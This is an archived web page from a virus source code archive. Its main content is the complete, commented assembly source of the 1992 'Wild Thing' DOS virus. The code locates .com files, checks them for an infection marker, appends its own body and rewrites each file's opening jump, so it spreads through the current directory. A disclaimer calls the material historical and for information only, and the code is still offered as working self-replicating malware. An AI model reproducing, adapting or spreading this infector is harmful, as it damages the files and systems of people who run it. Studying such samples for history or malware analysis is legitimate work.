<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: wildthng_asm</title>
<meta name="KEYWORDS" content="wildthng.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for wildthng.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
;
; Wild Thing Virus
;
; By Admiral Bailey - Youths Against McAfee
;
; Ahh the good old days.  This is my first com infector.  Oh well hope you
; learn something off it.
;
;****************************************************************************

code    segment public 'code'
        assume  cs:code, ds:code, ss:code, es:code
        org     100h

bof     equ     $                       ; marks the beginning of the file

start:
        jmp     virus

program db      0cdh,20h,7,8,9          ; just here as a dummy program
                                        ; cd 20 ect.  It is also used as a
                                        ; marker to see if the file is
                                        ; infected

baj     equ     $                       ; marks the beginning after the jmp

virussize       =     eof - bof         ; automatically calcs the size of the
                                        ; file

;---
;  This is the beginning...
;---------
virus:
        call    realcode                ; push loc on stack

realcode        proc    near
        pop     si                      ; will pop this loc off into si
        push    si                      ; and then put it back on so we have
                                        ; the number but dont inturrupt
                                        ; anything
        sub     si,offset realcode      ; get the loc in file where bov is
        mov     bp,[si+offset oldjump2] ; put in bp where we will jump when
        add     bp,offset program       ; done

;---
;  This procedure finds the first file in the current dir...
;----------
        mov     ah,4eh                  ; findfirst command
        lea     dx,[si+offset filespec] ; load loc of filespec in dx
        xor     cx,cx                   ; find normal attrib
        int     21h

        jc      quit                    ; none found then quit
        jmp     openfile                ; if found file then open it

;---
;  This quits the program
;---------
quit:
        mov     ah,09h
        mov     dx,si
        add     dx,offset messege
        int     21h

        jmp     bp                      ; jump back to orig program.

;---
;  If we found a first file then their might be another... here we look for
;  more com files.
;---------
findnext:
        mov     ah,4fh                  ; find next file
        int     21h

        jc      quit                    ; no more files then quit

;---
;  This procedure opens the file
;---------
openfile:
        mov     ax,3d02h                ; open file for read/write
        mov     dx,80h + 1eh            ; file name loc in dta
        int     21h

        mov     bx,ax                   ; put handle in bx
        jc      findnext                ; if error opening then get another

;---
;  Here we read the first three bytes 'jmp XXXX' and store for later...
;--------
        mov     cx,3                    ; read 1st 3 bytes
        mov     ah,3fh                  ; read file command
        mov     dx, si                  ; get loc in file where bov is
        add     dx,offset oldjump       ; add offset where we keep read
        mov     di,dx                   ; put loc of buffer in di for later
        int     21h                     ; read the file

        jc      closefile               ; if error close up and find another

        cmp     byte ptr [di],0e9h      ; is file larger than 256?
        jne     closefile               ; nope then quit

        ; there must be a way I can take out this part

        mov     dx,[di+1]               ; put the jump value in dx
        mov     [si+offset oldjump2],dx ; move that jump value by its self

        xor     cx,cx                   ; put 0 in cx
        mov     ax,4200h                ; this will set the file pointer to
                                        ; where the ident. string would be
        int     21h

        mov     dx,di                   ; the location buffer
        mov     cx,2                    ; read two bytes only marker
        mov     ah,3fh                  ; read bytes
        int     21h

        cmp     word ptr [di], 807h     ; check if file already infected
                                        ; (pop es)

        je      closefile               ; already infected get another

;---
;  Now move the file pointer to the end
;---------
        mov     ax,4202h                ; set file pointer to eof
        xor     cx,cx                   ; clear these
        xor     dx,dx                   ;
        int     21h

        jc      closefile               ; if error quit

        cmp     dx,0                    ; is file too large
        jne     closefile               ; yes then quit

        push    bx                      ; save handle on stack

        mov     bx, si                  ; loc of bov in file
        add     bx,offset newjump       ; add offset of new jump
        mov     [bx],ax                 ; save new jump

        pop     bx                      ; get handle off stack

;---
;  Write the virus to end
;---------
        mov     ah,40h                  ; write the virus
        mov     cx,virussize+3          ; number of bytes + extra
        mov     dx,si
        add     dx,offset baj           ; where to start writing from
        sub     dx,3                    ; sub 3 because of jump or something
        int     21h

        jc      closefile               ; if error writing quit file

;---
;  Now we have to move the fp to the beginning of the file
;---------
        mov     ax,4200h                ; set file pointer to begin
        xor     cx,cx                   ; clear this
        mov     dx,1                    ; set right after first jump
        int     21h

;---
;  Now we write back the first bytes... 'jmp viruscode'
;---------
        mov     ah,40h                  ; write to file
        mov     cx,2                    ; just the new jump
        mov     dx, si
        add     dx,offset newjump       ; where the new jump is
        int     21h                     ; write it...

;---
;  Close the file
;---------
closefile:
        mov     ah,3eh                  ; close file
        int     21h

        jmp     findnext                ; find another file


realcode        endp

messege         db      'This is a Wild Thing',13,10
                db      'Programmed By Admiral Bailey [YAM]',13,10
                db      '(C) 1992 YAM Inc.',13,10,'$'
filespec        db      '*.com',0       ; type of files to find
oldjump         db      3 dup (0)       ; to hold the old jump with jmp
oldjump2        dw      0               ; to hold just the old jump loc
newjump         dw      0               ; holds the new jump

eof     equ     $                       ; marks the total end of the file

code    ends

        end     start



</textarea></td></tr></table></body></html>
